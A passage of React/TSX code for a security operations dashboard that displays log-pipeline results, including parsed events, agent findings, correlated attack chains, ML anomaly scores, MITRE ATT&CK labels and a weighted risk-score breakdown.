                      }`}
                    >
                      {Math.round(result.risk_assessment.risk_score)}
                      <span className="text-sm font-normal text-slate-500">/100</span>
                    </div>
                    <div className="text-[10px] text-slate-300 font-semibold uppercase tracking-wider mt-0.5">
                      Band: {result.risk_assessment.risk_band} • Priority: {result.risk_assessment.priority}
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Persistent SOC Incident Link */}
            {result.incident && (
              <div className="mt-5 pt-4 border-t border-red-800/40 flex flex-wrap items-center justify-between gap-3 bg-red-950/30 -mx-6 -mb-6 p-4 px-6">
                <div className="flex items-center gap-2 text-xs text-red-200">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span>
                    Incident <strong>{result.incident.id}</strong> recorded to local SOC database & Incident Queue.
                  </span>
                </div>
                {onNavigate && (
                  <button
                    onClick={() => {
                      if (onNavigateToIncident && result.incident?.id) {
                        onNavigateToIncident(result.incident.id);
                      } else {
                        onNavigate('incidents');
                      }
                    }}
                    className="px-3.5 py-1.5 rounded-lg bg-red-600 hover:bg-red-500 text-white text-xs font-semibold flex items-center gap-1.5 transition shadow"
                  >
                    View in SOC Incidents <ArrowRight className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>
            )}
          </div>

          {/* Pipeline Stage Navigation Tabs */}
          <div className="flex flex-wrap items-center gap-2 border-b border-slate-800 pb-2">
            {[
              { id: 'overview', label: 'Pipeline Summary', icon: Layers },
              { id: 'preprocessing', label: `Stage 2: Preprocessing (${result.events_parsed} events)`, icon: Filter },
              { id: 'agents', label: `Stage 3: Agent Findings (${result.findings_count})`, icon: Terminal },
              { id: 'correlation', label: `Stage 4: Correlated Incidents (${result.correlations?.length || result.incidents?.length || 0})`, icon: HardDrive },
              { id: 'threats', label: 'Stage 5: Threat & ML Detections', icon: ShieldAlert },
              { id: 'risk', label: 'Stage 6: Risk Analysis Formula', icon: BarChart3 }
            ].map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`px-3.5 py-2 rounded-xl text-xs font-semibold flex items-center gap-2 transition ${
                    activeTab === tab.id
                      ? 'bg-slate-800 text-cyan-300 border border-slate-700 shadow-sm'
                      : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
                  }`}
                >
                  <Icon className="w-3.5 h-3.5" />
                  <span>{tab.label}</span>
                </button>
              );
            })}
          </div>

          {/* TAB 1: OVERVIEW METRIC STATS */}
          {activeTab === 'overview' && (
            <div className="space-y-6">
              {/* Pipeline 6-Stage Execution Cards */}
              <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-6 gap-3">
                {[
                  {
                    stage: 'Stage 1',
                    name: 'Upload & Parse',
                    status: 'COMPLETED',
                    value: `${result.files?.length || 1} file(s)`,
                    sub: 'Format validated'
                  },
                  {
                    stage: 'Stage 2',
                    name: 'Preprocessing',
                    status: 'COMPLETED',
                    value: `${result.events_parsed} parsed`,
                    sub: `${result.duplicate_events || 0} duplicates`
                  },
                  {
                    stage: 'Stage 3',
                    name: 'Specialized Agents',
                    status: 'COMPLETED',
                    value: `${result.agents_used.length} active`,
                    sub: `${result.findings_count} findings`
                  },
                  {
                    stage: 'Stage 4',
                    name: 'Event Correlation',
                    status: 'COMPLETED',
                    value: `${result.correlations?.length || 0} chains`,
                    sub: 'Cross-surface'
                  },
                  {
                    stage: 'Stage 5',
                    name: 'Threat & ML',
                    status: 'COMPLETED',
                    value: result.threat_detected ? 'Threats' : 'Benign',
                    sub: 'Random + IsoForest'
                  },
                  {
                    stage: 'Stage 6',
                    name: 'Risk Analysis',
                    status: 'COMPLETED',
                    value: `${Math.round(result.risk_assessment?.risk_score || 0)}/100`,
                    sub: result.risk_assessment?.risk_band || 'Low'
                  }
                ].map((stg, i) => (
                  <div
                    key={i}
                    className="p-3.5 rounded-xl bg-slate-900/90 border border-slate-800 space-y-1 text-left"
                  >
                    <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono">
                      <span>{stg.stage}</span>
                      <span className="text-emerald-400 flex items-center gap-1">
                        <CheckCircle2 className="w-2.5 h-2.5" /> Done
                      </span>
                    </div>
                    <div className="text-xs font-bold text-slate-200">{stg.name}</div>
                    <div className="text-base font-extrabold text-white">{stg.value}</div>
                    <div className="text-[10px] text-slate-400">{stg.sub}</div>
                  </div>
                ))}
              </div>

              {/* High-Level Overview Grid */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
                  <div className="text-xs text-slate-400 font-medium">Events Parsed</div>
                  <div className="text-2xl font-bold text-white mt-1">{result.events_parsed}</div>
                  <div className="text-[10px] text-slate-500 mt-1">Normalized schema</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
                  <div className="text-xs text-slate-400 font-medium">Security Findings</div>
                  <div className="text-2xl font-bold text-red-400 mt-1">{result.findings_count}</div>
                  <div className="text-[10px] text-slate-500 mt-1">Agent indicators</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
                  <div className="text-xs text-slate-400 font-medium">Correlated Chains</div>
                  <div className="text-2xl font-bold text-cyan-400 mt-1">
                    {result.correlations?.length || 0}
                  </div>
                  <div className="text-[10px] text-slate-500 mt-1">Connected multi-stage attacks</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
                  <div className="text-xs text-slate-400 font-medium">Agents Involved</div>
                  <div className="text-sm font-semibold text-slate-200 mt-2 flex flex-wrap gap-1">
                    {result.agents_used?.length ? (
                      result.agents_used.map((a) => (
                        <span key={a} className="px-2 py-0.5 rounded bg-slate-800 text-[11px] text-cyan-300 font-medium">
                          {a}
                        </span>
                      ))
                    ) : (
                      <span className="text-slate-500 text-xs">All Agents</span>
                    )}
                  </div>
                </div>
              </div>

              {/* Uploaded File Reports Summary Table */}
              {result.files && result.files.length > 0 && (
                <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-3">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <FileSpreadsheet className="w-4 h-4 text-cyan-400" />
                    Uploaded Files Ingestion Report (Stage 1)
                  </h3>
                  <div className="overflow-x-auto">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-slate-950/60 text-slate-400 uppercase tracking-wider font-semibold border-b border-slate-800 text-[10px]">
                        <tr>
                          <th className="p-3">File Name</th>
                          <th className="p-3">Format</th>
                          <th className="p-3">Detected Source</th>
                          <th className="p-3 text-right">Records</th>
                          <th className="p-3 text-right">Valid</th>
                          <th className="p-3 text-right">Errors</th>
                          <th className="p-3 text-right">Status</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/80">
                        {result.files.map((f, i) => (
                          <tr key={i} className="hover:bg-slate-800/40 transition">
                            <td className="p-3 font-semibold text-slate-200 flex items-center gap-2">
                              <FileText className="w-3.5 h-3.5 text-slate-400" />
                              {f.filename}
                            </td>
                            <td className="p-3">
                              <span className="font-mono text-[10px] bg-slate-800 text-cyan-300 px-2 py-0.5 rounded">
                                {f.detected_format}
                              </span>
                            </td>
                            <td className="p-3 text-slate-300">{f.detected_source_type}</td>
                            <td className="p-3 text-right text-slate-300">{f.records_count}</td>
                            <td className="p-3 text-right text-emerald-400 font-semibold">{f.valid_records_count}</td>
                            <td className="p-3 text-right text-red-400">{f.error_count}</td>
                            <td className="p-3 text-right">
                              <span className="text-[10px] px-2 py-0.5 rounded-full font-semibold bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">
                                {f.processing_status}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 2: PREPROCESSING & NORMALIZED DATA PREVIEW */}
          {activeTab === 'preprocessing' && (
            <div className="space-y-4">
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-4">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Filter className="w-4 h-4 text-cyan-400" />
                      Stage 2: Preprocessing & Normalized Schema Preview
                    </h3>
                    <p className="text-xs text-slate-400 mt-1">
                      Raw logs cleaned, timestamps parsed to ISO-8601, IP addresses & ports normalized, and fields mapped across sources.
                    </p>
                  </div>

                  {/* Search and Filter bar */}
                  <div className="flex flex-wrap items-center gap-2">
                    <div className="relative">
                      <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
                      <input
                        type="text"
                        value={eventSearch}
                        onChange={(e) => setEventSearch(e.target.value)}
                        placeholder="Search IP, user, message..."
                        className="bg-slate-950 border border-slate-800 rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500 w-48"
                      />
                    </div>
                    <select
                      value={sourceFilter}
                      onChange={(e) => setSourceFilter(e.target.value)}
                      className="bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                    >
                      <option value="ALL">All Sources</option>
                      <option value="NETWORK">Network Logs</option>
                      <option value="SYSTEM">System / Auth</option>
                      <option value="APPLICATION">Application</option>
                    </select>
                  </div>
                </div>

                {/* Normalized Events Table */}
                <div className="overflow-x-auto border border-slate-800 rounded-xl">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-slate-950/80 text-slate-400 uppercase tracking-wider font-semibold border-b border-slate-800 text-[10px]">
                      <tr>
                        <th className="p-3">Time</th>
                        <th className="p-3">Source</th>
                        <th className="p-3">Source IP</th>
                        <th className="p-3">Destination IP</th>
                        <th className="p-3">Port/Proto</th>
                        <th className="p-3">Host</th>
                        <th className="p-3">User</th>
                        <th className="p-3">Event / Action</th>
                        <th className="p-3 text-right">Inspect</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 font-mono text-[11px]">
                      {filteredEvents.length > 0 ? (
                        filteredEvents.slice(0, 100).map((evt) => (
                          <tr key={evt.event_id} className="hover:bg-slate-800/40 transition group">
                            <td className="p-3 text-slate-400 whitespace-nowrap">{evt.timestamp}</td>
                            <td className="p-3 font-sans">
                              <span
                                className={`text-[10px] px-2 py-0.5 rounded font-semibold ${
                                  evt.source_type === 'NETWORK'
                                    ? 'bg-blue-500/10 text-blue-300 border border-blue-500/20'
                                    : evt.source_type === 'SYSTEM'
                                    ? 'bg-amber-500/10 text-amber-300 border border-amber-500/20'
                                    : 'bg-purple-500/10 text-purple-300 border border-purple-500/20'
                                }`}
                              >
                                {evt.source_type}
                              </span>
                            </td>
                            <td className="p-3 text-cyan-300">{evt.src_ip || '—'}</td>
                            <td className="p-3 text-slate-300">{evt.dst_ip || '—'}</td>
                            <td className="p-3 text-slate-400">
                              {evt.dst_port ? `${evt.dst_port}/${evt.protocol || 'TCP'}` : evt.protocol || '—'}
                            </td>
                            <td className="p-3 text-slate-300 font-sans">{evt.host || '—'}</td>
                            <td className="p-3 text-amber-300 font-sans">{evt.username || '—'}</td>
                            <td className="p-3 font-sans text-slate-200 max-w-xs truncate">
                              {evt.action ? `${evt.action}: ` : ''}
                              {evt.message || evt.event_type}
                            </td>
                            <td className="p-3 text-right font-sans">
                              <button
                                onClick={() => setSelectedEvent(evt)}
                                className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-medium transition inline-flex items-center gap-1"
                              >
                                <Eye className="w-3 h-3" /> Drilldown
                              </button>
                            </td>
                          </tr>
                        ))
                      ) : (
                        <tr>
                          <td colSpan={9} className="p-8 text-center text-slate-500 font-sans">
                            No normalized events matching the search criteria.
                          </td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>

                {filteredEvents.length > 100 && (
                  <div className="text-center text-xs text-slate-500 pt-2">
                    Showing first 100 events of {filteredEvents.length}. Use filters above to narrow results.
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB 3: SPECIALIZED MULTI-AGENT DETECTIONS */}
          {activeTab === 'agents' && (
            <div className="space-y-6">
              {/* Agent Overview Badges */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-4 rounded-xl bg-slate-900/90 border border-blue-900/40 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-lg bg-blue-500/20 text-blue-400">
                      <Network className="w-5 h-5" />
                    </div>
                    <div>
                      <div className="text-xs text-slate-400">Network Agent</div>
                      <div className="text-lg font-bold text-white">
                        {result.findings.filter((f) => f.agent.toLowerCase().includes('network')).length} Findings
                      </div>
                    </div>
                  </div>
                  <span className="text-[10px] font-semibold text-blue-400 bg-blue-950/60 px-2 py-1 rounded border border-blue-800/60">
                    Active
                  </span>
                </div>

                <div className="p-4 rounded-xl bg-slate-900/90 border border-amber-900/40 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-lg bg-amber-500/20 text-amber-400">
                      <Cpu className="w-5 h-5" />
                    </div>
                    <div>
                      <div className="text-xs text-slate-400">System Agent</div>
                      <div className="text-lg font-bold text-white">
                        {result.findings.filter((f) => f.agent.toLowerCase().includes('system')).length} Findings
                      </div>
                    </div>
                  </div>
                  <span className="text-[10px] font-semibold text-amber-400 bg-amber-950/60 px-2 py-1 rounded border border-amber-800/60">
                    Active
                  </span>
                </div>

                <div className="p-4 rounded-xl bg-slate-900/90 border border-purple-900/40 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-lg bg-purple-500/20 text-purple-400">
                      <Globe className="w-5 h-5" />
                    </div>
                    <div>
                      <div className="text-xs text-slate-400">Application Agent</div>
                      <div className="text-lg font-bold text-white">
                        {result.findings.filter((f) => f.agent.toLowerCase().includes('application') || f.agent.toLowerCase().includes('app')).length} Findings
                      </div>
                    </div>
                  </div>
                  <span className="text-[10px] font-semibold text-purple-400 bg-purple-950/60 px-2 py-1 rounded border border-purple-800/60">
                    Active
                  </span>
                </div>
              </div>

              {/* Detailed Findings List */}
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-4">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-red-400" />
                  Specialized Agent Findings Breakdown ({result.findings.length})
                </h3>

                {result.findings.length > 0 ? (
                  <div className="space-y-3">
                    {result.findings.map((f, i) => (
                      <div
                        key={f.id || i}
                        className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-slate-700 transition space-y-2.5"
                      >
                        <div className="flex flex-wrap items-center justify-between gap-2">
                          <div className="flex items-center gap-2.5">
                            <span
                              className={`text-xs px-2.5 py-0.5 rounded-full font-semibold border ${
                                f.agent.toLowerCase().includes('network')
                                  ? 'bg-blue-500/20 text-blue-300 border-blue-500/30'
                                  : f.agent.toLowerCase().includes('system')
                                  ? 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                                  : 'bg-purple-500/20 text-purple-300 border-purple-500/30'
                              }`}
                            >
                              {f.agent}
                            </span>
                            <h4 className="text-sm font-bold text-white">{f.threat_type}</h4>
                          </div>

                          <div className="flex items-center gap-2">
                            <span
                              className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                                f.severity === 'CRITICAL'
                                  ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                                  : f.severity === 'HIGH'
                                  ? 'bg-orange-500/20 text-orange-300 border border-orange-500/40'
                                  : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                              }`}
                            >
                              {f.severity}
                            </span>
                            <span className="text-xs text-slate-400">
                              Confidence: {Math.round(f.confidence * 100)}%
                            </span>
                          </div>
                        </div>

                        <p className="text-xs text-slate-300 leading-relaxed">{f.description}</p>

                        {/* Evidence bullet list */}
                        {f.evidence && f.evidence.length > 0 && (
                          <div className="bg-slate-900/90 p-3 rounded-lg border border-slate-800 text-[11px] font-mono text-slate-300 space-y-1">
                            <span className="text-[10px] text-slate-500 font-sans block uppercase tracking-wider font-semibold">
                              Forensic Evidence Captured:
                            </span>
                            {f.evidence.map((ev, idx) => (
                              <div key={idx} className="truncate text-slate-300">
                                • {ev}
                              </div>
                            ))}
                          </div>
                        )}

                        <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                          {f.mitre_technique && (
                            <div className="flex items-center gap-2 text-[11px] text-slate-400">
                              <span className="text-slate-500">MITRE ATT&CK:</span>
                              <span className="bg-slate-800 text-cyan-300 px-2 py-0.5 rounded border border-slate-700 font-mono">
                                {f.mitre_technique}
                              </span>
                              {f.mitre_tactic && (
                                <span className="text-slate-500">({f.mitre_tactic})</span>
                              )}
                            </div>
                          )}

                          <button
                            onClick={() => setSelectedFinding(f)}
                            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium transition inline-flex items-center gap-1 ml-auto"
                          >
                            <Eye className="w-3.5 h-3.5" /> View Finding Details
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="p-8 text-center text-slate-500 text-xs">
                    No threat findings identified by security agents.
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB 4: EVENT CORRELATION & MULTI-STAGE ATTACK CHAINS */}
          {activeTab === 'correlation' && (
            <div className="space-y-4">
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-4">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Layers className="w-4 h-4 text-cyan-400" />
                      Stage 4: Cross-Surface Event Correlation & Attack Chains
                    </h3>
                    <p className="text-xs text-slate-400 mt-1">
                      Correlates events across Network, System, and Application layers matching shared IP addresses, timing windows, and attack kill-chains.
                    </p>
                  </div>
                </div>

                {result.incidents && result.incidents.length > 0 ? (
                  <div className="space-y-4">
                    {result.incidents.map((inc) => (
                      <div
                        key={inc.incident_id}
                        className="p-5 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-slate-700 transition space-y-4"
                      >
                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <span className="font-mono text-xs text-cyan-400 bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800">
                                {inc.incident_id}
                              </span>
                              <span
                                className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                                  inc.severity === 'CRITICAL'
                                    ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                                    : 'bg-orange-500/20 text-orange-300 border border-orange-500/40'
                                }`}
                              >
                                {inc.severity}
                              </span>
                              <span className="text-xs text-slate-500">
                                Priority: {inc.priority}
                              </span>
                            </div>
                            <h4 className="text-base font-bold text-white">{inc.title}</h4>
                          </div>

                          <div className="flex items-center gap-3">
                            <div className="text-right">
                              <div className="text-[10px] text-slate-500 font-medium">Risk Score</div>
                              <div className="text-xl font-bold text-red-400">
                                {inc.risk_score}
                                <span className="text-xs text-slate-500">/100</span>
                              </div>
                            </div>
                            <button
                              onClick={() => setSelectedIncident(inc)}
                              className="px-3 py-1.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold flex items-center gap-1.5 transition shadow"
                            >
                              <Eye className="w-3.5 h-3.5" /> Inspect Incident
                            </button>
                          </div>
                        </div>

                        {/* Connected Attack Entities */}
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs bg-slate-900/90 p-3 rounded-lg border border-slate-800">
                          <div>
                            <span className="text-slate-500 text-[10px] uppercase tracking-wider block">Attacker IP(s):</span>
                            <span className="font-mono text-cyan-300 font-semibold">
                              {inc.affected_entities?.ips?.join(', ') || 'N/A'}
                            </span>
                          </div>
                          <div>
                            <span className="text-slate-500 text-[10px] uppercase tracking-wider block">Target Host(s):</span>
                            <span className="font-mono text-slate-200">
                              {inc.affected_entities?.hosts?.join(', ') || 'server01'}
                            </span>
                          </div>
                          <div>
                            <span className="text-slate-500 text-[10px] uppercase tracking-wider block">Targeted User(s):</span>
                            <span className="font-mono text-amber-300">
                              {inc.affected_entities?.users?.join(', ') || 'root, admin'}
                            </span>
                          </div>
                        </div>

                        {/* Attack Timeline */}
                        {inc.timeline && inc.timeline.length > 0 && (
                          <div className="space-y-2">
                            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                              Correlated Attack Progression:
                            </span>
                            <div className="relative pl-6 space-y-3 before:absolute before:left-2 before:top-2 before:bottom-2 before:w-0.5 before:bg-slate-800">
                              {inc.timeline.map((item, idx) => (
                                <div key={idx} className="relative text-xs">
                                  <span className="absolute -left-6 top-1 w-2.5 h-2.5 rounded-full bg-cyan-400 ring-4 ring-slate-900" />
                                  <div className="flex flex-wrap items-center gap-2">
                                    <span className="text-slate-500 font-mono text-[10px]">{item.timestamp}</span>
                                    <span className="text-cyan-300 font-semibold">{item.phase}:</span>
                                    <span className="text-slate-300">{item.description}</span>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="p-8 text-center text-slate-500 text-xs">
                    No multi-agent correlations formed. Events did not exhibit cross-surface attack chains.
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB 5: THREAT DETECTION & MACHINE LEARNING */}
          {activeTab === 'threats' && (
            <div className="space-y-6">
              {/* Machine Learning Model Evaluation Card */}
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-4">
                <div className="flex items-center justify-between">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <Activity className="w-4 h-4 text-cyan-400" />
                    Stage 5: Machine Learning & Anomaly Evaluation
                  </h3>
                  <span className="text-[10px] font-mono text-cyan-300 bg-cyan-950 px-2.5 py-1 rounded border border-cyan-800">
                    Dual Engine: Random Forest + Isolation Forest
                  </span>
                </div>

                {result.ml_evaluation ? (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Random Forest Classifier */}
                    <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold text-slate-300">Random Forest Classifier</span>
                        <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/60">
                          Supervised
                        </span>
                      </div>
                      <div className="text-xl font-bold text-white">
                        {result.ml_evaluation.random_forest.predicted_class}
                      </div>
                      <div className="flex items-center justify-between text-xs text-slate-400 pt-1">
                        <span>Classification Confidence:</span>
                        <span className="font-bold text-cyan-400">
                          {Math.round(result.ml_evaluation.random_forest.confidence * 100)}%
                        </span>
                      </div>
                      <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden mt-1">
                        <div
                          className="bg-cyan-400 h-full rounded-full"
                          style={{ width: `${Math.round(result.ml_evaluation.random_forest.confidence * 100)}%` }}
                        />
                      </div>
                    </div>

                    {/* Isolation Forest Anomaly Detector */}
                    <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold text-slate-300">Isolation Forest Anomaly Detector</span>
                        <span
                          className={`text-[10px] font-mono px-2 py-0.5 rounded border ${
                            result.ml_evaluation.isolation_forest.is_anomaly
                              ? 'bg-red-950/60 text-red-400 border-red-800/60'
                              : 'bg-emerald-950/60 text-emerald-400 border-emerald-800/60'
                          }`}
                        >
                          {result.ml_evaluation.isolation_forest.is_anomaly ? 'ANOMALY DETECTED' : 'NORMAL DISTRIBUTION'}
                        </span>
                      </div>
                      <div className="text-xl font-bold text-white">
                        Score: {result.ml_evaluation.isolation_forest.anomaly_score.toFixed(3)}
                      </div>
                      <div className="flex items-center justify-between text-xs text-slate-400 pt-1">
                        <span>Anomaly Threshold:</span>
                        <span className="font-mono text-slate-300">0.550</span>
                      </div>
                      <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden mt-1">
                        <div
                          className={`h-full rounded-full ${
                            result.ml_evaluation.isolation_forest.is_anomaly ? 'bg-red-400' : 'bg-emerald-400'
                          }`}
                          style={{ width: `${Math.min(100, Math.round(result.ml_evaluation.isolation_forest.anomaly_score * 100))}%` }}
                        />
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="text-xs text-slate-400 p-4 bg-slate-950/60 rounded-xl border border-slate-800">
                    Deterministic rule-based threat evaluation completed.
                  </div>
                )}

                {/* MITRE ATT&CK Matrix Mapping */}
                <div className="pt-2">
                  <h4 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3">
                    MITRE ATT&CK Taxonomy Mapped to Findings
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                    {[
                      { tactic: 'Reconnaissance', tech: 'T1046: Network Service Scanning', desc: 'Port sweep and banner grabbing' },
                      { tactic: 'Credential Access', tech: 'T1110: Brute Force', desc: 'SSH authentication password spraying' },
                      { tactic: 'Initial Access', tech: 'T1190: Exploit Public-Facing App', desc: 'Web SQL injection & directory traversal' },
                      { tactic: 'Privilege Escalation', tech: 'T1078: Valid Accounts & Sudo', desc: 'Abuse of administrative elevation' }
                    ].map((item, idx) => (
                      <div key={idx} className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
                        <div className="text-[10px] text-cyan-400 font-semibold">{item.tactic}</div>
                        <div className="font-bold text-slate-200 font-mono text-[11px]">{item.tech}</div>
                        <div className="text-[11px] text-slate-500">{item.desc}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 6: RISK ANALYSIS & MATHEMATICAL FORMULA */}
          {activeTab === 'risk' && (
            <div className="space-y-6">
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-lg space-y-6">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <BarChart3 className="w-4 h-4 text-cyan-400" />
                    Stage 6: Deterministic Evidence-Based Risk Score Calculation
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Risk score (0-100) is calculated strictly from empirical security evidence, not arbitrary estimates.
                  </p>
                </div>

                {/* Formula Visual Card */}
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs space-y-2">
                  <div className="text-slate-400 font-semibold uppercase tracking-wider text-[10px]">
                    Mathematical Calculation Model:
                  </div>
                  <div className="font-mono text-cyan-300 text-xs leading-relaxed bg-slate-900/80 p-3 rounded border border-slate-800">
                    RiskScore = (ThreatSeverity × 0.40) + (MLConfidence × 0.20) + (AnomalyFrequency × 0.15) + (CorrelationBoost × 0.15) + (AssetCriticality × 0.10)
                  </div>
                </div>

                {/* Weight Breakdown Cards */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
                  {[
                    { factor: 'Base Threat Severity', weight: '40%', val: result.threat_detected ? 'High' : 'Zero', desc: 'Criticality of identified attack pattern' },
                    { factor: 'ML Confidence', weight: '20%', val: `${Math.round((result.findings[0]?.confidence || 0.85) * 100)}%`, desc: 'Random Forest & heuristic match' },
                    { factor: 'Anomaly Frequency', weight: '15%', val: `${result.events_parsed} Evts`, desc: 'Rate and repetition of events' },
                    { factor: 'Cross-Agent Correlation', weight: '15%', val: `${result.correlations?.length || 0} Links`, desc: 'Multi-layer kill chain amplification' },
                    { factor: 'Asset Criticality', weight: '10%', val: 'Internal SOC', desc: 'Target machine sensitivity' }
                  ].map((item, idx) => (
                    <div key={idx} className="p-3.5 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
                      <div className="flex items-center justify-between text-[10px] text-slate-500">
                        <span>Weight:</span>
                        <span className="font-mono text-cyan-400 font-bold">{item.weight}</span>
                      </div>
                      <div className="font-semibold text-slate-200">{item.factor}</div>
                      <div className="text-base font-bold text-white">{item.val}</div>
                      <div className="text-[10px] text-slate-400">{item.desc}</div>
                    </div>
                  ))}
                </div>

                {/* Risk Band Table */}
                <div className="overflow-x-auto border border-slate-800 rounded-xl">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-slate-950 text-slate-400 uppercase tracking-wider text-[10px] font-semibold border-b border-slate-800">
                      <tr>
                        <th className="p-3">Risk Band</th>
                        <th className="p-3">Score Range</th>
                        <th className="p-3">SOC Priority</th>
                        <th className="p-3">Action Standard</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      <tr className={result.risk_assessment?.risk_band === 'Critical' ? 'bg-red-950/40 font-semibold' : ''}>
                        <td className="p-3 text-red-400">Critical</td>
                        <td className="p-3 font-mono">75 - 100</td>
                        <td className="p-3 text-red-300">P1 (Immediate)</td>
                        <td className="p-3 text-slate-300">Active breach containment, escalation to lead responder</td>
                      </tr>
                      <tr className={result.risk_assessment?.risk_band === 'High' ? 'bg-orange-950/40 font-semibold' : ''}>
                        <td className="p-3 text-orange-400">High</td>
                        <td className="p-3 font-mono">50 - 74</td>
                        <td className="p-3 text-orange-300">P2 (Elevated)</td>
                        <td className="p-3 text-slate-300">Investigation queue priority, target host isolation triage</td>
                      </tr>
                      <tr className={result.risk_assessment?.risk_band === 'Medium' ? 'bg-amber-950/40 font-semibold' : ''}>
                        <td className="p-3 text-amber-400">Medium</td>
                        <td className="p-3 font-mono">25 - 49</td>
                        <td className="p-3 text-amber-300">P3 (Standard)</td>
                        <td className="p-3 text-slate-300">Routine operational review and telemetry trend tracking</td>
                      </tr>
                      <tr className={result.risk_assessment?.risk_band === 'Low' ? 'bg-emerald-950/40 font-semibold' : ''}>
                        <td className="p-3 text-emerald-400">Low</td>
                        <td className="p-3 font-mono">0 - 24</td>
                        <td className="p-3 text-emerald-300">P4 (Informational)</td>
                        <td className="p-3 text-slate-300">Normal operational traffic, no intervention required</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
